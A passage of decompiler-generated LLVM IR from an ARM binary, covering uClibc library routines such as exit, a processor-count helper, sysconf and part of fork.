  br i1 %v2_13630, label %bb71, label %dec_label_pc_1363c

bb71:                                             ; preds = %thread-pre-split
  %v4_13634 = mul i32 %v0_13610, %v1_13608
  %v5_13634 = add i32 %v4_13634, %v3_13634
  store i32 %v5_13634, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_135dc

dec_label_pc_1363c:                               ; preds = %bb67, %thread-pre-split
  %v0_13644 = call i32 @__aeabi_read_tp()
  %v0_13648 = load i32, i32* %r7.global-to-local, align 4
  %v2_13648 = and i32 %v0_1350c, %v0_13648
  store i32 %v2_13648, i32* %r7.global-to-local, align 4
  %v0_1364c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1364c, i32* %ip.global-to-local, align 4
  %v3_13650 = load i16, i16* @global_var_21d68.334, align 2
  %v4_13650 = sext i16 %v3_13650 to i32
  %v3_13658 = add i32 %v4_13650, %v0_13644
  %v4_13658 = inttoptr i32 %v3_13658 to i32*
  store i32 34, i32* %v4_13658, align 4
  %v0_135dc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_135dc

dec_label_pc_13660.loopexit:                      ; preds = %bb66
  %v0_13660.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_13660

dec_label_pc_13660:                               ; preds = %.thread, %dec_label_pc_13660.loopexit
  %v1_13664 = phi i32 [ %v1_1366427, %dec_label_pc_13660.loopexit ], [ %v1_1366429, %.thread ]
  %v2_13664 = phi i32 [ %v0_13660.pre, %dec_label_pc_13660.loopexit ], [ %v0_13500, %.thread ]
  %v2_13660 = icmp eq i32 %v2_13664, 0
  br i1 %v2_13660, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_13660
  %v3_13664 = inttoptr i32 %v2_13664 to i32*
  store i32 %v1_13664, i32* %v3_13664, align 4
  br label %bb73

bb73:                                             ; preds = %dec_label_pc_13660, %bb72
  %v0_1366c = load i32, i32* %r7.global-to-local, align 4
  %v2_1366c = icmp eq i32 %v0_1366c, 0
  %. = select i1 %v2_1366c, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r1.global-to-local, align 4
  %v2_13678 = icmp eq i32 %v0_1350c, 0
  %v0_136a4.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v2_13678, label %dec_label_pc_1369c, label %bb76

bb76:                                             ; preds = %bb73
  %tmp81 = icmp ugt i32 %v0_136a4.pre.pre, %.
  br i1 %tmp81, label %dec_label_pc_13684, label %dec_label_pc_1369c

dec_label_pc_13684:                               ; preds = %bb76
  %v0_13688 = call i32 @__aeabi_read_tp()
  %v3_1368c = load i16, i16* @global_var_21d68.334, align 2
  %v4_1368c = sext i16 %v3_1368c to i32
  %v3_13694 = add i32 %v4_1368c, %v0_13688
  %v4_13694 = inttoptr i32 %v3_13694 to i32*
  store i32 34, i32* %v4_13694, align 4
  %v0_13698 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_13698, i32* %ip.global-to-local, align 4
  %v0_1369c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1369c

dec_label_pc_1369c:                               ; preds = %bb76, %bb73, %dec_label_pc_13684
  %v0_136a4.pre = phi i32 [ %v0_136a4.pre.pre, %bb76 ], [ %v0_13698, %dec_label_pc_13684 ], [ %v0_136a4.pre.pre, %bb73 ]
  %v0_1369c = phi i32 [ %v0_1366c, %bb76 ], [ %v0_1369c.pre, %dec_label_pc_13684 ], [ %v0_1366c, %bb73 ]
  %v2_1369c = icmp eq i32 %v0_1369c, 0
  br i1 %v2_1369c, label %dec_label_pc_1369c._crit_edge, label %bb77

bb77:                                             ; preds = %dec_label_pc_1369c
  %v2_136a0 = sub i32 0, %v0_136a4.pre
  store i32 %v2_136a0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1369c._crit_edge

dec_label_pc_1369c._crit_edge:                    ; preds = %dec_label_pc_1369c, %bb77
  %v0_136a4 = phi i32 [ %v2_136a0, %bb77 ], [ %v0_136a4.pre, %dec_label_pc_1369c ]
  ret i32 %v0_136a4

; uselistorder directives
  uselistorder i32 %v0_136a4.pre, { 1, 0 }
  uselistorder i32 %v0_136a4.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_1362c, { 1, 0 }
  uselistorder i1 %v3_13624, { 1, 0 }
  uselistorder i32 %v1_13624, { 1, 0 }
  uselistorder i32 %v5_13604, { 1, 0 }
  uselistorder i32 %v1_135f0, { 1, 0 }
  uselistorder i32 %v1_135e8, { 2, 0, 1 }
  uselistorder i32 %v0_1361c, { 1, 0, 2 }
  uselistorder i32 %v0_135dc, { 1, 0 }
  uselistorder i32 %v3_1358c, { 1, 0 }
  uselistorder i32 %v1_13580, { 1, 0, 2 }
  uselistorder i32 %v0_13574, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_13550, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1350c, { 1, 0 }
  uselistorder i32 %v0_13508, { 1, 0, 2, 3 }
  uselistorder i32 %v0_13504, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 6, 0, 7, 1, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 7, 8 }
  uselistorder i32 34, { 1, 2, 0, 4, 5, 3, 6 }
  uselistorder i8 48, { 1, 0, 2 }
  uselistorder i32 -17, { 1, 0 }
  uselistorder i8 45, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1369c._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1369c, { 2, 0, 1 }
  uselistorder label %bb73, { 1, 0 }
  uselistorder label %dec_label_pc_13660, { 1, 0 }
  uselistorder label %dec_label_pc_1363c, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb69, { 1, 0 }
  uselistorder label %bb66, { 2, 1, 0 }
  uselistorder label %dec_label_pc_135e0, { 1, 0 }
  uselistorder label %dec_label_pc_135dc, { 1, 0 }
  uselistorder label %bb64, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13554, { 1, 0 }
  uselistorder label %dec_label_pc_13550, { 1, 0 }
  uselistorder label %dec_label_pc_13518, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* @r5, align 4
  %v4_136d0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 140) to i32*), align 4
  store i32 %v4_136d0, i32* @r4, align 4
  %v2_136d8 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_136f0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_136f0)
  %v0_13704 = load i32, i32* @r5, align 4
  %v2_13704 = add i32 %v0_13704, 16
  %v3_13704 = inttoptr i32 %v2_13704 to i32*
  %v4_13704 = load i32, i32* %v3_13704, align 4
  call void @__pseudo_branch(i32 %v4_13704)
  %v0_13714 = load i32, i32* @r5, align 4
  %v2_13714 = add i32 %v0_13714, 636
  %v3_13714 = inttoptr i32 %v2_13714 to i32*
  %v4_13714 = load i32, i32* %v3_13714, align 4
  %v2_1371c = icmp eq i32 %v4_13714, 0
  br i1 %v2_1371c, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v2_13728 = xor i1 %v2_1371c, true
  call void @__pseudo_cond_branch(i1 %v2_13728, i32 %v4_13714)
  store i32 %v2_136d8, i32* @r0, align 4
  %v0_13738 = load i32, i32* @r5, align 4
  %v2_13738 = add i32 %v0_13738, 44
  %v3_13738 = inttoptr i32 %v2_13738 to i32*
  %v4_13738 = load i32, i32* %v3_13738, align 4
  call void @__pseudo_branch(i32 %v4_13738)
  %v0_13744 = call i32 @__GI___uClibc_fini()
  %v0_1374c = load i32, i32* @r5, align 4
  %v2_1374c = add i32 %v0_1374c, -47692
  %v2_13754 = icmp eq i32 %v2_1374c, 0
  br i1 %v2_13754, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_1375c = xor i1 %v2_13754, true
  call void @__pseudo_cond_branch(i1 %v2_1375c, i32 %v2_1374c)
  %v0_13760 = load i32, i32* @r6, align 4
  %v1_13764 = call i32 @__GI__exit(i32 %v0_13760)
  %v0_13768 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13768, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v3_13768 = load i32, i32* @r6, align 4
  %v8_13768 = lshr i32 %v4_13738, %v3_13768
  %v9_13768 = and i32 %v8_13768, %v1_13764
  store i32 %v9_13768, i32* @lr, align 4
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v4_13780 = phi i32 [ %v1_13764, %bb9 ], [ 0, %bb10 ]
  ret i32 %v4_13780

; uselistorder directives
  uselistorder i32 %v1_13764, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @nprocessors_onln() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 -34012), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_137a8 = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 -34012))
  store i32 %v1_137a8, i32* @r6, align 4
  %v2_137ac = icmp eq i32 %v1_137a8, 0
  br i1 %v2_137ac, label %dec_label_pc_1382c, label %dec_label_pc_137b4

dec_label_pc_137b4:                               ; preds = %entry
  store i32 276, i32* @sl, align 4
  %v0_137bc = load i32, i32* @r4, align 4
  %v2_137bc = add i32 %v0_137bc, -34000
  store i32 %v2_137bc, i32* @r8, align 4
  %v2_137c0 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_137c0, i32* @r7, align 4
  br label %bb18

dec_label_pc_137c8:                               ; preds = %bb18
  %v3_137c8 = load i32, i32* %stack_var_-36, align 4
  %v1_137cc = inttoptr i32 %v3_137c8 to i32*
  %v2_137cc = load i32, i32* %v1_137cc, align 4
  %v1_137d0 = inttoptr i32 %v2_137cc to i8*
  %v2_137d0 = load i8, i8* %v1_137d0, align 1
  %v7_137d4 = icmp eq i8 %v2_137d0, 99
  br i1 %v7_137d4, label %dec_label_pc_137dc, label %.backedge3

dec_label_pc_137dc:                               ; preds = %dec_label_pc_137c8
  %v1_137dc = add i32 %v2_137cc, 1
  %v2_137dc = inttoptr i32 %v1_137dc to i8*
  %v3_137dc = load i8, i8* %v2_137dc, align 1
  %v7_137e0 = icmp eq i8 %v3_137dc, 112
  br i1 %v7_137e0, label %dec_label_pc_137e8, label %.backedge3

dec_label_pc_137e8:                               ; preds = %dec_label_pc_137dc
  %v1_137e8 = add i32 %v2_137cc, 2
  %v2_137e8 = inttoptr i32 %v1_137e8 to i8*
  %v3_137e8 = load i8, i8* %v2_137e8, align 1
  %v7_137ec = icmp eq i8 %v3_137e8, 117
  br i1 %v7_137ec, label %dec_label_pc_137f4, label %.backedge3

dec_label_pc_137f4:                               ; preds = %dec_label_pc_137e8
  %v1_137f4 = add i32 %v2_137cc, 3
  %v2_137f4 = inttoptr i32 %v1_137f4 to i8*
  %v3_137f4 = load i8, i8* %v2_137f4, align 1
  %v4_137f4 = zext i8 %v3_137f4 to i32
  %v0_137f8 = load i32, i32* @r4, align 4
  %v1_137f8 = load i32, i32* @sl, align 4
  %v2_137f8 = add i32 %v1_137f8, %v0_137f8
  %v3_137f8 = inttoptr i32 %v2_137f8 to i32*
  %v4_137f8 = load i32, i32* %v3_137f8, align 4
  %v2_137fc = mul nuw nsw i32 %v4_137f4, 2
  %v2_13800 = add i32 %v4_137f8, %v2_137fc
  %v3_13800 = inttoptr i32 %v2_13800 to i16*
  %v4_13800 = load i16, i16* %v3_13800, align 2
  %v1_13804 = and i16 %v4_13800, 8
  %v2_13804 = icmp eq i16 %v1_13804, 0
  br i1 %v2_13804, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_137f4
  %v1_13808 = load i32, i32* @r5, align 4
  %v2_13808 = add i32 %v1_13808, 1
  store i32 %v2_13808, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_137f4, %dec_label_pc_137c8, %dec_label_pc_137dc, %dec_label_pc_137e8
  %v0_1380c.pre = load i32, i32* @r6, align 4
  %v0_13818.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_137b4
  %v0_13818 = phi i32 [ %v0_13818.pre, %.backedge3 ], [ %v2_137bc, %dec_label_pc_137b4 ]
  %v0_1380c = phi i32 [ %v0_1380c.pre, %.backedge3 ], [ %v1_137a8, %dec_label_pc_137b4 ]
  %v4_1381c = inttoptr i32 %v0_1380c to i32*
  %v5_1381c = call i32 @__GI_config_read(i32* %v4_1381c, i32 %v2_137c0, i32 258, i32 %v0_13818)
  %v2_13820 = icmp eq i32 %v5_1381c, 0
  br i1 %v2_13820, label %dec_label_pc_13890, label %dec_label_pc_137c8

dec_label_pc_1382c:                               ; preds = %entry
  %v0_13830 = load i32, i32* @r4, align 4
  %v2_13830 = add i32 %v0_13830, -33996
  store i32 %v2_13830, i32* @r0, align 4
  %v1_13834 = call i32 @__GI_config_open(i32 %v2_13830)
  store i32 %v1_13834, i32* @r6, align 4
  %v2_13838 = icmp eq i32 %v1_13834, 0
  br i1 %v2_13838, label %bb19, label %dec_label_pc_13844

bb19:                                             ; preds = %dec_label_pc_1382c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_13890

dec_label_pc_13844:                               ; preds = %dec_label_pc_1382c
  %v0_13848 = load i32, i32* @r4, align 4
  %v2_13848 = add i32 %v0_13848, -33980
  store i32 %v2_13848, i32* @r8, align 4
  %v2_13850 = add i32 %v0_13848, -33944
  store i32 %v2_13850, i32* @r7, align 4
  %v2_13854 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_13854, i32* @r4, align 4
  br label %bb21

dec_label_pc_1385c:                               ; preds = %bb21
  %v0_13888 = load i32, i32* @r8, align 4
  %v3_1385c = load i32, i32* %stack_var_-36, align 4
  %v1_13860 = inttoptr i32 %v3_1385c to i32*
  %v2_13860 = load i32, i32* %v1_13860, align 4
  store i32 %v2_13860, i32* @r1, align 4
  %v2_13864 = inttoptr i32 %v0_13888 to i8*
  %v3_13864 = call i32 @__GI_strcoll(i8* %v2_13864, i32 %v2_13860)
  %v2_13868 = icmp eq i32 %v3_13864, 0
  br i1 %v2_13868, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_1385c
  %v1_1386c = load i32, i32* @r5, align 4
  %v2_1386c = add i32 %v1_1386c, 1
  store i32 %v2_1386c, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_1385c
  %v0_13878.pre = load i32, i32* @r7, align 4
  %v0_1387c.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_13844
  %v0_1387c = phi i32 [ %v0_1387c.pre, %.backedge ], [ %v1_13834, %dec_label_pc_13844 ]
  %v0_13878 = phi i32 [ %v0_13878.pre, %.backedge ], [ %v2_13850, %dec_label_pc_13844 ]
  %v4_13880 = inttoptr i32 %v0_1387c to i32*
  %v5_13880 = call i32 @__GI_config_read(i32* %v4_13880, i32 %v2_13854, i32 459266, i32 %v0_13878)
  %v2_13884 = icmp eq i32 %v5_13880, 0
  br i1 %v2_13884, label %dec_label_pc_13890, label %dec_label_pc_1385c

dec_label_pc_13890:                               ; preds = %bb18, %bb21, %bb19
  %v0_13890 = load i32, i32* @r6, align 4
  %v1_13894 = inttoptr i32 %v0_13890 to i32*
  %v2_13894 = call i32 @__GI_config_close(i32* %v1_13894)
  %v0_13898 = load i32, i32* @r5, align 4
  %v2_13898 = icmp eq i32 %v0_13898, 0
  %.v0_13898 = select i1 %v2_13898, i32 1, i32 %v0_13898
  ret i32 %.v0_13898

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder i32 (i32)* @__GI_config_open, { 1, 0 }
  uselistorder label %dec_label_pc_13890, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @sysconf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_13cc4

bb:                                               ; preds = %entry
  %v7_138e8 = mul i32 %arg1, 4
  %v8_138e8 = add i32 %v7_138e8, ptrtoint (i32* @global_var_138f0.482 to i32)
  call void @__pseudo_branch(i32 %v8_138e8)
  br label %dec_label_pc_13cc4

dec_label_pc_13cc4:                               ; preds = %bb, %entry
  %v0_13cc8 = call i32 @__aeabi_read_tp()
  %v3_13ccc = load i16, i16* @global_var_21d68.334, align 2
  %v4_13ccc = sext i16 %v3_13ccc to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_13cd8 = add i32 %v4_13ccc, %v0_13cc8
  %v4_13cd8 = inttoptr i32 %v3_13cd8 to i32*
  store i32 22, i32* %v4_13cd8, align 4
  %v0_13ebc = load i32, i32* %r1.global-to-local, align 4
  ret i32 %v0_13ebc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_13ef8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_13ef8, i32* @ip, align 4
  store i32 12780, i32* %r5.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %r8.global-to-local, align 4
  %v4_13fe816 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 12780) to i32*), align 4
  store i32 %v4_13fe816, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13fec18 = icmp eq i32 %v4_13fe816, 0
  br i1 %v2_13fec18, label %dec_label_pc_13ff4, label %dec_label_pc_13f18

dec_label_pc_13f18:                               ; preds = %entry, %dec_label_pc_13fe8.backedge
  store i32 -61441, i32* @ip, align 4
  call void @__pseudo_branch(i32 -61536)
  %v0_13f24 = load i32, i32* %r7.global-to-local, align 4
  %v1_13f24 = add i32 %v0_13f24, 20
  %v2_13f24 = inttoptr i32 %v1_13f24 to i32*
  %v3_13f24 = load i32, i32* %v2_13f24, align 4
  store i32 %v3_13f24, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13f28 = icmp eq i32 %v3_13f24, 0
  store i32 %v3_13f24, i32* %r4.global-to-local, align 4
  br i1 %v2_13f28, label %dec_label_pc_13fe8.backedge, label %dec_label_pc_13f38

dec_label_pc_13fe8.backedge:                      ; preds = %dec_label_pc_13f18, %dec_label_pc_13f64
  %v0_13fe8 = load i32, i32* %r8.global-to-local, align 4
  %v1_13fe8 = load i32, i32* %r5.global-to-local, align 4
  %v2_13fe8 = add i32 %v1_13fe8, %v0_13fe8
  %v3_13fe8 = inttoptr i32 %v2_13fe8 to i32*
  %v4_13fe8 = load i32, i32* %v3_13fe8, align 4
  store i32 %v4_13fe8, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13fec = icmp eq i32 %v4_13fe8, 0
  br i1 %v2_13fec, label %dec_label_pc_13ff4, label %dec_label_pc_13f18

dec_label_pc_13f38:                               ; preds = %dec_label_pc_13f18
  %v0_13f38 = load i32, i32* %r8.global-to-local, align 4
  %v1_13f38 = load i32, i32* %r5.global-to-local, align 4
  %v2_13f38 = add i32 %v1_13f38, %v0_13f38
  %v3_13f38 = inttoptr i32 %v2_13f38 to i32*
  %v4_13f38 = load i32, i32* %v3_13f38, align 4
  %v1_13f3c = add i32 %v4_13f38, 20
  store i32 %v1_13f3c, i32* %r2.global-to-local, align 4
  %v1_13f40132 = inttoptr i32 %v1_13f3c to i32*
  %v2_13f40133 = load i32, i32* %v1_13f40132, align 4
  store i32 %v2_13f40133, i32* %r3.global-to-local, align 4
  %v3_13f44135 = icmp uge i32 %v2_13f40133, %v3_13f24
  store i1 %v3_13f44135, i1* %cpsr_c.global-to-local, align 1
  %v9_13f44141 = icmp eq i32 %v2_13f40133, %v3_13f24
  br i1 %v9_13f44141, label %dec_label_pc_13f4c, label %dec_label_pc_13f64

dec_label_pc_13f4c:                               ; preds = %dec_label_pc_13f38, %dec_label_pc_13f4c.dec_label_pc_13f40_crit_edge
  %v0_13f4c142 = phi i32 [ %v1_13f44.pre, %dec_label_pc_13f4c.dec_label_pc_13f40_crit_edge ], [ %v3_13f24, %dec_label_pc_13f38 ]
  store i32 %v0_13f4c142, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_13f5c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13f5c, label %dec_label_pc_13f60, label %dec_label_pc_13f4c.dec_label_pc_13f40_crit_edge

dec_label_pc_13f4c.dec_label_pc_13f40_crit_edge:  ; preds = %dec_label_pc_13f4c
  %v0_13f40.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13f44.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13f40 = inttoptr i32 %v0_13f40.pre to i32*
  %v2_13f40 = load i32, i32* %v1_13f40, align 4
  store i32 %v2_13f40, i32* %r3.global-to-local, align 4
  %v3_13f44 = icmp uge i32 %v2_13f40, %v1_13f44.pre
  store i1 %v3_13f44, i1* %cpsr_c.global-to-local, align 1
  %v9_13f44 = icmp eq i32 %v2_13f40, %v1_13f44.pre
  br i1 %v9_13f44, label %dec_label_pc_13f4c, label %dec_label_pc_13f64

dec_label_pc_13f60:                               ; preds = %dec_label_pc_13f4c
  %v0_13f60 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13f60, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13f64

dec_label_pc_13f64:                               ; preds = %dec_label_pc_13f38, %dec_label_pc_13f4c.dec_label_pc_13f40_crit_edge, %dec_label_pc_13f60
  %v0_13f64 = phi i32 [ %v0_13f60, %dec_label_pc_13f60 ], [ %v2_13f40133, %dec_label_pc_13f38 ], [ %v2_13f40, %dec_label_pc_13f4c.dec_label_pc_13f40_crit_edge ]
  %v1_13f64 = phi i32 [ %v0_13f60, %dec_label_pc_13f60 ], [ %v3_13f24, %dec_label_pc_13f38 ], [ %v1_13f44.pre, %dec_label_pc_13f4c.dec_label_pc_13f40_crit_edge ]
  %v3_13f64 = icmp uge i32 %v0_13f64, %v1_13f64
  store i1 %v3_13f64, i1* %cpsr_c.global-to-local, align 1
  %v9_13f64 = icmp eq i32 %v0_13f64, %v1_13f64
  br i1 %v9_13f64, label %dec_label_pc_13f6c, label %dec_label_pc_13fe8.backedge

dec_label_pc_13f6c:                               ; preds = %dec_label_pc_13f64
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_13f80 = ptrtoint i32* %stack_var_-88 to i32
  br label %dec_label_pc_13f70

dec_label_pc_13f70:                               ; preds = %dec_label_pc_13fd8, %dec_label_pc_13f6c
  %v0_13f70 = load i32, i32* %r7.global-to-local, align 4
  %v1_13f70 = add i32 %v0_13f70, 4
  %v2_13f70 = inttoptr i32 %v1_13f70 to i32*
  %v3_13f70 = load i32, i32* %v2_13f70, align 4
  store i32 %v3_13f70, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13f74 = icmp eq i32 %v3_13f70, 0
  br i1 %v2_13f74, label %bb72, label %bb

bb:                                               ; preds = %dec_label_pc_13f70
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_13f70, %bb
  %v2_13f7c = xor i1 %v2_13f74, true
  call void @__pseudo_cond_branch(i1 %v2_13f7c, i32 %v3_13f70)
  %v0_13f84 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_13f84, i32* %stack_var_-88, align 4
  %v1_13f88 = inttoptr i32 %v0_13f84 to i32*
  %v2_13f88 = load i32, i32* %v1_13f88, align 4
  store i32 %v2_13f88, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13f8c = icmp eq i32 %v2_13f88, 0
  store i32 %v2_13f80, i32* %r5.global-to-local, align 4
  br i1 %v2_13f8c, label %dec_label_pc_13ff8.loopexit, label %dec_label_pc_13fa0

dec_label_pc_13fa0:                               ; preds = %bb72
  %v1_13fa0 = add i32 %v2_13f88, 20
  store i32 %v1_13fa0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13fa4

dec_label_pc_13fa4:                               ; preds = %dec_label_pc_13fd8.dec_label_pc_13fa4_crit_edge, %dec_label_pc_13fa0
  %v0_13fa8 = phi i32 [ %v0_13fa8.pre, %dec_label_pc_13fd8.dec_label_pc_13fa4_crit_edge ], [ %v1_13fa0, %dec_label_pc_13fa0 ]
  %v0_13fa4 = phi i32 [ %v0_13fa4.pre, %dec_label_pc_13fd8.dec_label_pc_13fa4_crit_edge ], [ %v2_13f88, %dec_label_pc_13fa0 ]
  %v1_13fa4 = add i32 %v0_13fa4, 20
  %v2_13fa4 = inttoptr i32 %v1_13fa4 to i32*
  %v3_13fa4 = load i32, i32* %v2_13fa4, align 4
  store i32 %v0_13fa8, i32* %r2.global-to-local, align 4
  store i32 %v3_13fa4, i32* %r4.global-to-local, align 4
  %v1_13fb4119 = inttoptr i32 %v0_13fa8 to i32*
  %v2_13fb4120 = load i32, i32* %v1_13fb4119, align 4
  store i32 %v2_13fb4120, i32* %r3.global-to-local, align 4
  %v3_13fb8122 = icmp uge i32 %v2_13fb4120, %v3_13fa4
  store i1 %v3_13fb8122, i1* %cpsr_c.global-to-local, align 1
  %v9_13fb8128 = icmp eq i32 %v2_13fb4120, %v3_13fa4
  br i1 %v9_13fb8128, label %dec_label_pc_13fc0, label %dec_label_pc_13fd8

dec_label_pc_13fc0:                               ; preds = %dec_label_pc_13fa4, %dec_label_pc_13fc0.dec_label_pc_13fb4_crit_edge
  %v0_13fc0129 = phi i32 [ %v1_13fb8.pre, %dec_label_pc_13fc0.dec_label_pc_13fb4_crit_edge ], [ %v3_13fa4, %dec_label_pc_13fa4 ]
  store i32 %v0_13fc0129, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_13fd0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13fd0, label %dec_label_pc_13fd4, label %dec_label_pc_13fc0.dec_label_pc_13fb4_crit_edge

dec_label_pc_13fc0.dec_label_pc_13fb4_crit_edge:  ; preds = %dec_label_pc_13fc0
  %v0_13fb4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13fb8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13fb4 = inttoptr i32 %v0_13fb4.pre to i32*
  %v2_13fb4 = load i32, i32* %v1_13fb4, align 4
  store i32 %v2_13fb4, i32* %r3.global-to-local, align 4
  %v3_13fb8 = icmp uge i32 %v2_13fb4, %v1_13fb8.pre
  store i1 %v3_13fb8, i1* %cpsr_c.global-to-local, align 1
  %v9_13fb8 = icmp eq i32 %v2_13fb4, %v1_13fb8.pre
  br i1 %v9_13fb8, label %dec_label_pc_13fc0, label %dec_label_pc_13fd8

dec_label_pc_13fd4:                               ; preds = %dec_label_pc_13fc0
  %v0_13fd4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13fd4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13fd8

dec_label_pc_13fd8:                               ; preds = %dec_label_pc_13fa4, %dec_label_pc_13fc0.dec_label_pc_13fb4_crit_edge, %dec_label_pc_13fd4
  %v0_13fd8 = phi i32 [ %v0_13fd4, %dec_label_pc_13fd4 ], [ %v2_13fb4120, %dec_label_pc_13fa4 ], [ %v2_13fb4, %dec_label_pc_13fc0.dec_label_pc_13fb4_crit_edge ]
  %v1_13fd8 = phi i32 [ %v0_13fd4, %dec_label_pc_13fd4 ], [ %v3_13fa4, %dec_label_pc_13fa4 ], [ %v1_13fb8.pre, %dec_label_pc_13fc0.dec_label_pc_13fb4_crit_edge ]
  %v3_13fd8 = icmp uge i32 %v0_13fd8, %v1_13fd8
  store i1 %v3_13fd8, i1* %cpsr_c.global-to-local, align 1
  %v9_13fd8 = icmp eq i32 %v0_13fd8, %v1_13fd8
  store i32 %v2_13f80, i32* %r4.global-to-local, align 4
